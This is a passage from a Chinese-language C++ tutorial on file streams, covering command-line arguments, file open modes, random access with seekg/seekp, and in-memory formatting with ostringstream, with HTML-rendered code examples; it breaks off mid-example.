<strong><code>is_open()</code>:</strong> 文件流对象提供 <code>is_open()</code> 成员函数，用于检查文件是否成功打开并与流关联。在尝试进行任何 I/O 操作之前，<strong>务必</strong>调用此函数进行检查。</li><li><strong>流状态位:</strong> 文件流对象也具有与 <code>cin</code> 相同的状态位 (<code>goodbit</code>, <code>eofbit</code>, <code>failbit</code>, <code>badbit</code>)。<ul><li>  如果 <code>open()</code> 失败，流对象的状态通常会设置为 <code>failbit</code>。因此，<code>if (!outFile)</code> 或 <code>if (!inFile)</code> 也可以用来检查文件是否成功打开。</li><li>  在读取过程中，如果遇到文件末尾，会设置 <code>eofbit</code>。</li><li>  如果读取的数据格式不匹配（例如，试图将文本读入 <code>int</code>），会设置 <code>failbit</code>。</li><li>  如果发生底层 I/O 错误，会设置 <code>badbit</code>。</li><li>  可以使用 <code>good()</code>, <code>eof()</code>, <code>fail()</code>, <code>bad()</code> 来检查这些状态，并使用 <code>clear()</code> 来清除错误状态（如果可恢复）。</li></ul></li></ul><h3 id="17-4-3-打开多个文件"><a href="#17-4-3-打开多个文件" class="headerlink" title="17.4.3 打开多个文件"></a>17.4.3 打开多个文件</h3><p>一个程序可以同时打开多个文件，只需为每个文件创建一个对应的文件流对象即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ifstream <span class="title">sourceFile</span><span class="params">(<span class="string">&quot;input.txt&quot;</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">destFile</span><span class="params">(<span class="string">&quot;output.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!sourceFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening input.txt&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!destFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening output.txt&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// sourceFile 会自动关闭</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> line;</span><br><span class="line">    <span class="keyword">while</span> (getline(sourceFile, line)) &#123;</span><br><span class="line">        <span class="comment">// 处理 line ...</span></span><br><span class="line">        destFile &lt;&lt; <span class="string">&quot;Copied: &quot;</span> &lt;&lt; line &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 写入到目标文件</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;File copy finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sourceFile 和 destFile 会在 main 结束时自动关闭</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-4-4-命令行处理技术"><a href="#17-4-4-命令行处理技术" class="headerlink" title="17.4.4 命令行处理技术"></a>17.4.4 命令行处理技术</h3><p>通常，我们希望在运行程序时通过<strong>命令行参数</strong>来指定要处理的文件名，而不是将文件名硬编码在程序中。<code>main</code> 函数可以接收命令行参数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <strong><code>argc</code> (argument count):</strong> 一个整数，表示传递给程序的命令行参数的<strong>数量</strong>（包括程序本身的名称）。</li><li><strong><code>argv</code> (argument vector):</strong> 一个指向 C 风格字符串（<code>char*</code>）的<strong>指针数组</strong>。<ul><li>  <code>argv[0]</code> 通常是程序本身的名称。</li><li>  <code>argv[1]</code> 是第一个命令行参数。</li><li>  <code>argv[2]</code> 是第二个命令行参数，依此类推。</li><li>  <code>argv[argc]</code> 是一个空指针 (<code>nullptr</code>)。</li></ul></li></ul><p><strong>示例：使用命令行参数指定输入和输出文件</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt; // 用于存储参数</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 检查参数数量是否正确</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123; <span class="comment">// 需要程序名 + 输入文件名 + 输出文件名</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Usage: &quot;</span> &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &lt;input_file&gt; &lt;output_file&gt;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// argv[1] 是输入文件名, argv[2] 是输出文件名</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ifstream <span class="title">sourceFile</span><span class="params">(argv[<span class="number">1</span>])</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">destFile</span><span class="params">(argv[<span class="number">2</span>])</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!sourceFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening input file: &quot;</span> &lt;&lt; argv[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!destFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening output file: &quot;</span> &lt;&lt; argv[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... (文件处理逻辑，例如复制) ...</span></span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">while</span> (sourceFile.get(ch)) &#123;</span><br><span class="line">        destFile.put(ch);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processed &quot;</span> &lt;&lt; argv[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; argv[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后，可以这样运行：<code>./my_program data.in results.out</code></p><h3 id="17-4-5-文件模式"><a href="#17-4-5-文件模式" class="headerlink" title="17.4.5 文件模式"></a>17.4.5 文件模式</h3><p>在打开文件时（通过构造函数或 <code>open()</code> 方法），可以指定<strong>文件模式 (file mode)</strong> 来控制文件的打开方式。文件模式是定义在 <code>ios_base</code> 类中的常量，类型为 <code>openmode</code> (一种位掩码类型)。</p><p>常用的文件模式标志：</p><ul><li>  <strong><code>ios_base::in</code>:</strong> 以<strong>读取</strong>模式打开 (ifstream 默认)。</li><li>  <strong><code>ios_base::out</code>:</strong> 以<strong>写入</strong>模式打开 (ofstream 默认)。如果文件已存在，<strong>清空</strong>其内容；如果不存在，则创建。</li><li>  <strong><code>ios_base::app</code> (append):</strong> 以<strong>追加</strong>模式打开。写入操作将在文件末尾进行。如果文件不存在，则创建。此模式下通常隐含 <code>ios_base::out</code>。</li><li>  <strong><code>ios_base::ate</code> (at end):</strong> 打开文件并将初始位置定位到<strong>文件末尾</strong>。但仍可以在文件中的任何位置写入（与 <code>app</code> 不同，<code>app</code> 强制写入到末尾）。</li><li>  <strong><code>ios_base::binary</code>:</strong> 以<strong>二进制</strong>模式打开文件，而不是文本模式。在二进制模式下，不会对特殊字符（如换行符 <code>\n</code> 或回车符 <code>\r</code>）进行转换。这对于读写非文本文件（如图像、可执行文件）或需要精确字节控制的情况至关重要。</li><li>  <strong><code>ios_base::trunc</code> (truncate):</strong> 如果文件已存在，<strong>清空</strong>其内容。<code>ios_base::out</code> 模式默认包含此行为。</li></ul><p>可以使用<strong>按位或运算符 (<code>|</code>)</strong> 来组合多个模式标志。</p><p><strong><code>open()</code> 方法:</strong></p><p>除了构造函数，还可以使用 <code>open()</code> 方法打开文件。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ofstream outFile;</span><br><span class="line">outFile.open(<span class="string">&quot;config.cfg&quot;</span>, ios_base::out | ios_base::trunc); <span class="comment">// 显式指定覆盖写入</span></span><br><span class="line"></span><br><span class="line">ifstream dataFile;</span><br><span class="line">dataFile.open(<span class="string">&quot;image.bin&quot;</span>, ios_base::in | ios_base::binary); <span class="comment">// 以二进制读取模式打开</span></span><br><span class="line"></span><br><span class="line">fstream ioFile;</span><br><span class="line"><span class="comment">// 以读写模式打开，如果不存在则创建，不清空内容</span></span><br><span class="line">ioFile.open(<span class="string">&quot;log.dat&quot;</span>, ios_base::in | ios_base::out | ios_base::binary);</span><br></pre></td></tr></table></figure><p><strong>默认模式:</strong></p><ul><li>  <code>ifstream</code> 默认模式是 <code>ios_base::in</code>。</li><li>  <code>ofstream</code> 默认模式是 <code>ios_base::out | ios_base::trunc</code>。</li><li>  <code>fstream</code> 没有默认模式，必须显式指定。</li></ul><h3 id="17-4-6-随机存取"><a href="#17-4-6-随机存取" class="headerlink" title="17.4.6 随机存取"></a>17.4.6 随机存取</h3><p>默认情况下，文件流是按顺序读取或写入的。但有时我们需要直接跳转到文件中的特定位置进行读写，这称为**随机存取 (Random Access)**。</p><p>文件流维护着内部的位置指针：</p><ul><li>  <strong>输入指针 (Get Pointer):</strong> <code>istream</code> (及 <code>ifstream</code>, <code>fstream</code>) 维护，指示下一次读取操作将从哪里开始。</li><li>  <strong>输出指针 (Put Pointer):</strong> <code>ostream</code> (及 <code>ofstream</code>, <code>fstream</code>) 维护，指示下一次写入操作将在哪里进行。</li></ul><p>可以使用以下方法来操作这些位置指针：</p><ul><li><p>  <strong><code>seekg(offset, direction)</code> (seek get):</strong> 移动输入指针。</p></li><li><p><strong><code>seekp(offset, direction)</code> (seek put):</strong> 移动输出指针。</p><ul><li>  <code>offset</code>: 一个整数值（类型通常是 <code>streamoff</code>），表示要移动的字节数。可以是正数（向文件末尾移动）或负数（向文件开头移动）。</li><li><code>direction</code>: 一个枚举值（类型 <code>seekdir</code>，定义在 <code>ios_base</code> 中），指定 <code>offset</code> 的参考点：<ul><li>  <code>ios_base::beg</code>: 从文件<strong>开头</strong>计算偏移量。</li><li>  <code>ios_base::cur</code>: 从文件<strong>当前</strong>位置计算偏移量。</li><li>  <code>ios_base::end</code>: 从文件<strong>末尾</strong>计算偏移量（此时 <code>offset</code> 通常为负数或零）。</li></ul></li></ul></li><li><p>  <strong><code>tellg()</code> (tell get):</strong> 返回输入指针的当前位置（类型通常是 <code>streampos</code>，可以转换为整数）。</p></li><li><p>  <strong><code>tellp()</code> (tell put):</strong> 返回输出指针的当前位置。</p></li></ul><p><strong>注意:</strong> 随机存取通常在<strong>二进制模式 (<code>ios_base::binary</code>)</strong> 下使用更可靠，因为文本模式下的字符转换可能会干扰精确的字节定位。</p><p><strong>示例：随机访问文件</strong></p><p>假设有一个存储记录的文件 <code>records.dat</code>，每条记录固定大小为 <code>sizeof(Record)</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Record</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">double</span> value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* filename = <span class="string">&quot;records.dat&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> recordSize = <span class="keyword">sizeof</span>(Record);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 写入一些记录 ---</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">outFile</span><span class="params">(filename, <span class="built_in">std</span>::ios::out | <span class="built_in">std</span>::ios::binary | <span class="built_in">std</span>::ios::trunc)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!outFile) &#123; <span class="comment">/* error check */</span> <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Record&gt; records = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="string">&quot;Rec A&quot;</span>, <span class="number">10.1</span>&#125;,</span><br><span class="line">        &#123;<span class="number">2</span>, <span class="string">&quot;Rec B&quot;</span>, <span class="number">20.2</span>&#125;,</span><br><span class="line">        &#123;<span class="number">3</span>, <span class="string">&quot;Rec C&quot;</span>, <span class="number">30.3</span>&#125;,</span><br><span class="line">        &#123;<span class="number">4</span>, <span class="string">&quot;Rec D&quot;</span>, <span class="number">40.4</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; rec : records) &#123;</span><br><span class="line">        outFile.write(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(&amp;rec), recordSize);</span><br><span class="line">    &#125;</span><br><span class="line">    outFile.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 随机读取和修改记录 ---</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::fstream <span class="title">ioFile</span><span class="params">(filename, <span class="built_in">std</span>::ios::in | <span class="built_in">std</span>::ios::out | <span class="built_in">std</span>::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!ioFile) &#123; <span class="comment">/* error check */</span> <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    Record tempRec;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 读取第三条记录 (索引为 2)</span></span><br><span class="line">    <span class="keyword">long</span> position = <span class="number">2</span> * recordSize;</span><br><span class="line">    ioFile.seekg(position, <span class="built_in">std</span>::ios::beg); <span class="comment">// 定位到第三条记录的开头</span></span><br><span class="line">    <span class="keyword">if</span> (ioFile.read(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(&amp;tempRec), recordSize)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read record at index 2: ID=&quot;</span> &lt;&lt; tempRec.id &lt;&lt; <span class="string">&quot;, Name=&quot;</span> &lt;&lt; tempRec.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to read record at index 2.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 修改第二条记录 (索引为 1)</span></span><br><span class="line">    <span class="keyword">if</span> (ioFile.good()) &#123; <span class="comment">// 确保流状态良好</span></span><br><span class="line">        position = <span class="number">1</span> * recordSize;</span><br><span class="line">        ioFile.seekp(position, <span class="built_in">std</span>::ios::beg); <span class="comment">// 定位输出指针到第二条记录开头</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取原始记录 (可选，如果需要基于原始值修改)</span></span><br><span class="line">        <span class="comment">// ioFile.seekg(position, std::ios::beg);</span></span><br><span class="line">        <span class="comment">// ioFile.read(reinterpret_cast&lt;char*&gt;(&amp;tempRec), recordSize);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 准备新数据并写入</span></span><br><span class="line">        Record updatedRec = &#123;<span class="number">2</span>, <span class="string">&quot;Record B Updated&quot;</span>, <span class="number">25.5</span>&#125;;</span><br><span class="line">        ioFile.write(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(&amp;updatedRec), recordSize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ioFile.fail()) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to write updated record at index 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Updated record at index 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 获取文件大小</span></span><br><span class="line">    ioFile.seekg(<span class="number">0</span>, <span class="built_in">std</span>::ios::end); <span class="comment">// 定位到文件末尾</span></span><br><span class="line">    <span class="keyword">long</span> fileSize = ioFile.tellg(); <span class="comment">// 获取当前位置 (即文件大小)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;File size: &quot;</span> &lt;&lt; fileSize &lt;&lt; <span class="string">&quot; bytes.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of records: &quot;</span> &lt;&lt; fileSize / recordSize &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    ioFile.close();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子演示了如何使用 <code>seekg</code> 和 <code>seekp</code> 定位到文件中的特定字节位置，并使用 <code>read</code> 和 <code>write</code> 进行二进制数据的读写。</p><h2 id="17-5-内核格式化"><a href="#17-5-内核格式化" class="headerlink" title="17.5 内核格式化"></a>17.5 内核格式化</h2><p>到目前为止，我们讨论的 I/O 操作都是将数据发送到外部设备（如屏幕 <code>cout</code>）或文件（<code>ofstream</code>），或者从外部设备（<code>cin</code>）或文件（<code>ifstream</code>）读取数据。但有时，我们希望在<strong>内存中</strong>对数据进行格式化，将各种类型的数据（数字、字符等）转换成一个字符串，或者反过来，从一个字符串中按特定格式解析出各种类型的数据。</p><p>C++ 标准库通过 <code>&lt;sstream&gt;</code> 头文件提供了<strong>字符串流 (String Streams)</strong> 类来实现这种<strong>内核格式化 (In-memory Formatting)</strong> 或 <strong>内存中的 I/O</strong>。</p><p><code>&lt;sstream&gt;</code> 定义了三个主要的类：</p><ol><li> <strong><code>ostringstream</code> (output string stream):</strong> 继承自 <code>ostream</code>。它允许你像使用 <code>cout</code> 一样，使用插入运算符 (<code>&lt;&lt;</code>) 和其他 <code>ostream</code> 方法将各种类型的数据<strong>写入</strong>到一个内部的字符串缓冲区中。之后可以获取这个格式化好的字符串。</li><li> <strong><code>istringstream</code> (input string stream):</strong> 继承自 <code>istream</code>。它允许你将一个已有的 <code>std::string</code> 或 C 风格字符串作为数据源，然后像使用 <code>cin</code> 一样，使用提取运算符 (<code>&gt;&gt;</code>) 和其他 <code>istream</code> 方法从中<strong>读取</strong>（解析）数据。</li><li> <strong><code>stringstream</code>:</strong> 继承自 <code>iostream</code>。它结合了 <code>ostringstream</code> 和 <code>istringstream</code> 的功能，允许对同一个内部字符串缓冲区进行<strong>读取和写入</strong>操作。</li></ol><p>这些字符串流类的行为与文件流或控制台流非常相似，因为它们共享相同的基类和接口。你可以使用同样的格式化操纵符（如 <code>setw</code>, <code>setprecision</code>, <code>fixed</code>, <code>hex</code> 等）来控制字符串流中的格式。</p><h3 id="使用-ostringstream-进行格式化输出"><a href="#使用-ostringstream-进行格式化输出" class="headerlink" title="使用 ostringstream 进行格式化输出"></a>使用 <code>ostringstream</code> 进行格式化输出</h3><p>当你需要将不同类型的数据组合成一个格式化的字符串时，<code>ostringstream</code> 非常有用。</p><p><strong>步骤:</strong></p><ol><li> 包含头文件 <code>#include &lt;sstream&gt;</code>。</li><li> 创建一个 <code>ostringstream</code> 对象。</li><li> 像使用 <code>cout</code> 一样，使用 <code>&lt;&lt;</code> 将数据插入到流中。可以使用格式化操纵符。</li><li> 使用 <code>str()</code> 成员函数获取流内部缓冲区中积累的 <code>std::string</code> 副本。</li></ol><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt; // 包含 sstream 头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // for setprecision, fixed</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建 ostringstream 对象</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">ostringstream</span> oss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 向流中插入数据并格式化</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> item = <span class="string">&quot;Gadget&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> quantity = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">12.99</span>;</span><br><span class="line">    <span class="keyword">double</span> total = quantity * price;</span><br><span class="line"></span><br><span class="line">    oss &lt;&lt; <span class="string">&quot;Item: &quot;</span> &lt;&lt; item &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 插入字符串和换行符</span></span><br><span class="line">    oss &lt;&lt; <span class="string">&quot;Quantity: &quot;</span> &lt;&lt; quantity &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    oss &lt;&lt; <span class="string">&quot;Price: $&quot;</span> &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; price &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 格式化浮点数</span></span><br><span class="line">    oss &lt;&lt; <span class="string">&quot;Total: $&quot;</span> &lt;&lt; total; <span class="comment">// 格式化设置是粘性的</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 获取格式化后的字符串</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> formatted_string = oss.str();</span><br><span class="line"></span><br><span class="line">    <span 